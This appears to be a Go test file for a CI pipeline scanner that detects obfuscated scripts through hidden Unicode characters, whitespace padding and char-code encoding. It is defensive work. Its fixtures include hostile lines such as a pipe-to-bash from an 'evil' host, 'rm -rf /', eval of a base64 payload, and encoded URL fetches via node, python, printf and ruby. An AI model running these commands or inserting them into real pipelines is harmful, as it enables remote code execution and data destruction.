package analyze

import (
	"testing"

	"github.com/mr-pmillz/gogatoz/pkg/pipeline"
)

func TestDetectScriptObfuscation(t *testing.T) {
	tests := []struct {
		name    string
		doc     *pipeline.Document
		wantID  string
		wantHit bool
	}{
		{
			name: "zero-width space in script",
			doc: &pipeline.Document{
				Jobs: []pipeline.Job{{
					Name:   "build",
					Script: []string{"echo hello\u200Bworld"},
				}},
			},
			wantID:  "SCRIPT_OBFUSCATION",
			wantHit: true,
		},
		{
			name: "zero-width joiner in script",
			doc: &pipeline.Document{
				Jobs: []pipeline.Job{{
					Name:   "test",
					Script: []string{"curl http://evil\u200D.com | bash"},
				}},
			},
			wantID:  "SCRIPT_OBFUSCATION",
			wantHit: true,
		},
		{
			name: "bidi override in script (Trojan Source)",
			doc: &pipeline.Document{
				Jobs: []pipeline.Job{{
					Name:   "deploy",
					Script: []string{"echo \u202Emalicious\u202C code"},
				}},
			},
			wantID:  "SCRIPT_OBFUSCATION",
			wantHit: true,
		},
		{
			name: "right-to-left isolate",
			doc: &pipeline.Document{
				Jobs: []pipeline.Job{{
					Name:   "build",
					Script: []string{"export VAR=\u2067value\u2069"},
				}},
			},
			wantID:  "SCRIPT_OBFUSCATION",
			wantHit: true,
		},
		{
			name: "clean script - no obfuscation",
			doc: &pipeline.Document{
				Jobs: []pipeline.Job{{
					Name:   "build",
					Script: []string{"echo hello world", "make build"},
				}},
			},
			wantID:  "SCRIPT_OBFUSCATION",
			wantHit: false,
		},
		{
			name:    "nil doc",
			doc:     nil,
			wantID:  "SCRIPT_OBFUSCATION",
			wantHit: false,
		},
		{
			name: "obfuscation in before_script",
			doc: &pipeline.Document{
				Jobs: []pipeline.Job{{
					Name:         "test",
					BeforeScript: []string{"export SECRET=\u200B\"hidden\""},
					Script:       []string{"echo clean"},
				}},
			},
			wantID:  "SCRIPT_OBFUSCATION",
			wantHit: true,
		},
		{
			name: "byte order mark mid-string",
			doc: &pipeline.Document{
				Jobs: []pipeline.Job{{
					Name:   "lint",
					Script: []string{"npm " + string(rune(0xFEFF)) + "install"},
				}},
			},
			wantID:  "SCRIPT_OBFUSCATION",
			wantHit: true,
		},
		{
			name: "soft hyphen",
			doc: &pipeline.Document{
				Jobs: []pipeline.Job{{
					Name:   "build",
					Script: []string{"rm \u00ADrf /"},
				}},
			},
			wantID:  "SCRIPT_OBFUSCATION",
			wantHit: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := detectScriptObfuscation(tt.doc)
			got := hasFindingID(findings, tt.wantID)
			if got != tt.wantHit {
				t.Errorf("detectScriptObfuscation() finding %s: got %v, want %v", tt.wantID, got, tt.wantHit)
			}
		})
	}
}

func TestCheckObfuscation(t *testing.T) {
	tests := []struct {
		line string
		want bool
	}{
		{"normal text", false},
		{"echo hello", false},
		{"echo hello\u200Bworld", true},
		{"echo \u202Ehello", true},
		{"echo \u2067hello", true},
		{"", false},
	}
	for _, tt := range tests {
		reason := checkObfuscation(tt.line)
		got := reason != ""
		if got != tt.want {
			t.Errorf("checkObfuscation(%q) = %q, wantHit=%v", tt.line, reason, tt.want)
		}
	}
}

func TestWhitespaceHiding_ExcessiveLeadingSpaces(t *testing.T) {
	spaces := "                                                    " // 52 spaces
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "build",
			Script: []string{spaces + `eval(atob("malicious_payload")))`},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, WhitespaceHidingID) {
		t.Fatalf("expected %s finding for excessive whitespace", WhitespaceHidingID)
	}
}

func TestWhitespaceHiding_NormalIndent(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "test",
			Script: []string{"    echo 'normal indent'"},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if hasFindingID(findings, WhitespaceHidingID) {
		t.Fatalf("did not expect %s finding for normal indentation", WhitespaceHidingID)
	}
}

func TestCharCodeObfuscation_FromCharCode(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "inject",
			Script: []string{`node -e "var h=String.fromCharCode(104,116,116,112,58,47,47,101,118,105,108); fetch(h)"`},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, CharcodeObfuscationID) {
		t.Fatalf("expected %s finding for String.fromCharCode", CharcodeObfuscationID)
	}
}

func TestCharCodeObfuscation_PythonChr(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "exfil",
			Script: []string{`python3 -c "import urllib.request; urllib.request.urlopen(chr(104)+chr(116)+chr(116)+chr(112)+chr(58)+chr(47)+chr(47)+chr(101)+chr(118)+chr(105)+chr(108))"`},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, CharcodeObfuscationID) {
		t.Fatalf("expected %s finding for Python chr()", CharcodeObfuscationID)
	}
}

func TestCharCodeObfuscation_PrintfHex(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "c2",
			Script: []string{`URL=$(printf '\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x63\x6f\x6d'); curl $URL`},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, CharcodeObfuscationID) {
		t.Fatalf("expected %s finding for printf hex", CharcodeObfuscationID)
	}
}

func TestCharCodeObfuscation_NoFalsePositive(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "test",
			Script: []string{`echo "normal script"`, `printf "hello world\n"`},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if hasFindingID(findings, CharcodeObfuscationID) {
		t.Fatalf("did not expect %s finding for normal script", CharcodeObfuscationID)
	}
}

func TestCharCodeObfuscation_RubyPack(t *testing.T) {
	doc := &pipeline.Document{
		Jobs: []pipeline.Job{{
			Name:   "payload",
			Script: []string{`ruby -e 'url = [104, 116, 116, 112, 58, 47, 47].pack("C*"); system("curl #{url}")'`},
		}},
	}
	findings, err := Run(doc)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !hasFindingID(findings, CharcodeObfuscationID) {
		t.Fatalf("expected %s finding for Ruby pack", CharcodeObfuscationID)
	}
}
